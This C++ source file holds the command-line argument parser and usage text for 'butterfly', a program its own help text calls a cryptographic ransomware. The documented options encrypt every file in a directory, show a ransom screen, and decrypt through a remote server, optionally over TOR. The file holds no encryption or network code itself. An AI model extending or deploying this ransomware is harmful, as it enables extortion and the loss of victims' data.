
#include "argumentParser.h"

namespace butterfly
{

ArgumentParser::ArgumentParser(int argc, char *argv[]) : _argc(argc), _argv(argv)
{
    // Save all arguments in vector
    for(int i = 1; i < _argc; i++)
    {
        _args.emplace_back(_argv[i]);
    }

}

ArgumentParser::Arguments ArgumentParser::parseArgs()
{

    Arguments args;

    if (_argc > 1)
    {
        bool found = false;
        for (int i = 1; i < _argc; i++)
        {

            std::string arg = _argv[i];

            if (arg == "-h" || arg == "--help")
            {
                showUsage();
                exit(1);

            } else if (arg == "-v" || arg == "--version")
            {
                showVersion();
                exit(1);

            } else if (arg == "-p" || arg == "--protected")
            {
                found = true;
                args.protection = true;
            } else if (arg == "-t" || arg == "--tor")
            {
                found = true;
                args.tor = true;
            }
            else if (arg == "-c" || arg == "--config")
            {
                // check end of argc
                if (i + 1 < _argc && (_argv[i + 1 ] != nullptr))
                {
                    std::string s(_argv[i + 1]);
                    if (s.at(0) != '-')
                    {
                        found = true;
                        args.config = _argv[i + 1];

                    } else
                    {
                        std::cout << "--config option requires one argument!" << std::endl;
                        exit(1);
                    }

                } else
                {
                    std::cout << "--config option requires one argument!" << std::endl;
                    exit(1);
                }

            } else if (arg == "-d" || arg == "--dir")
            {
                // check end of argc
                if (i + 1 < _argc && (_argv[i + 1] != nullptr))
                {
                    std::string s(_argv[i + 1]);
                    if (s.at(0) != '-')
                    {
                        found = true;
                        args.dir = _argv[i + 1];
                    } else
                    {
                        std::cout << "--dir option requires one argument!" << std::endl;
                        exit(1);
                    }

                } else
                {
                    std::cout << "--dir option requires one argument!" << std::endl;
                    exit(1);
                }

            } else if (arg == "-enc" || arg == "--encrypt")
            {

                // check end of argc
                if (i + 1 < _argc && (_argv[i + 1] != nullptr))
                {
                    std::string s(_argv[i + 1]);
                    if (s.at(0) != '-')
                    {
                        found = true;
                        args.encrypt = _argv[i + 1];
                    } else
                    {
                        std::cout << "--encrypt option requires one argument!" << std::endl;
                        exit(1);
                    }

                } else
                {
                    std::cout << "--encrypt option requires one argument!" << std::endl;
                    exit(1);
                }

            } else if (arg == "-dec" || arg == "--decrypt")
            {
                // check end of argc
                if (i + 1 < _argc && (_argv[i + 1] != nullptr))
                {
                    std::string s(_argv[i + 1]);
                    if (s.at(0) != '-')
                    {
                        found = true;
                        args.decrypt = _argv[i + 1];
                    } else
                    {
                        std::cout << "--decrypt option requires one argument!" << std::endl;
                        exit(1);
                    }

                } else
                {
                    std::cout << "--decrypt option requires one argument!" << std::endl;
                    exit(1);
                }

            } else if (arg == "-k" || arg == "--key")
            {
                // check end of argc
                if (i + 1 < _argc && (_argv[i + 1] != nullptr))
                {
                    std::string s(_argv[i + 1]);
                    if (s.at(0) != '-')
                    {
                        found = true;
                        args.serverpKey = _argv[i + 1];
                    } else
                    {
                        std::cout << "--key option requires one argument!" << std::endl;
                        exit(1);
                    }

                } else
                {
                    std::cout << "--key option requires one argument!" << std::endl;
                    exit(1);
                }

            } else
            {

                if ( i + 1 < _argc && (!strchr(_argv[i + 1], '-')) )
                {
                    found = false;
                }

            }
        }
        if (!found)
        {
            showUsage();
            exit(1);
        }
    } else
    {
        showUsage();
        exit(1);
    }

    return args;
}

void ArgumentParser::showUsage() const
{
    std::cout << "butterfly is a cryptographic ransomware\n\n" <<

               + "Usage: \n\t"
                        + std::string(PROJECT_NAME) + " --dir /home/butterfly/data/\n\t"
                        + std::string(PROJECT_NAME) + " --dir /home/butterfly/data/ --protected\n\n\t"
                        + std::string(PROJECT_NAME) + " --encrypt /home/butterfly/data/ \n\t"
                        + std::string(PROJECT_NAME) + " --decrypt /home/butterfly/data/ \n\t"
                        + std::string(PROJECT_NAME) + " --decrypt /home/butterfly/data/ --tor\n\n\t"
                        + std::string(PROJECT_NAME) + " --decrypt /home/butterfly/data/ --key /home/butterfly/butterfly/masterkeys/SPrivateRSA.pem\n\n"

               + "Options:\n"
                        + "\t-d,   --dir         Directory path to start the cryptographic ransomware (Encryption+Visualization+Payment+Decryption)\n"
                        + "\t-enc, --encrypt\t    Encrypts all files in provided directory path and shows the ransom visualization\n"
                        + "\t-dec, --decrypt\t    Decrypts all files in provided directory path, if the request to the remote server was successful\n"
                        + "\t-t,   --tor\t    Remote decryption over the TOR network\n"
                        + "\t-k,   --key         Masterkey for the decryption, if the remote server is not used (Corresponds to the embedded server public key)\n"
                        + "\t-p,   --protected   Saves all key files to the system (For manual decryption)\n"
                        + "\t-c,   --config\t    Logger config path\n"
                        + "\t-v,   --version\t    Show version information and quit\n"
                        + "\t-h,   --help\t    Show this message and quit"

               + "\n\nbutterfly homepage at: https://github.com/bierschi/butterfly"
    << std::endl;
}

void ArgumentParser::showVersion() const
{
    std::cout    << PROJECT_NAME << " " << PROJECT_VER << std::endl
                 << "© 2021 by Bierschneider Christian (@bierschi)"
    << std::endl;
}

} // namespace butterfly
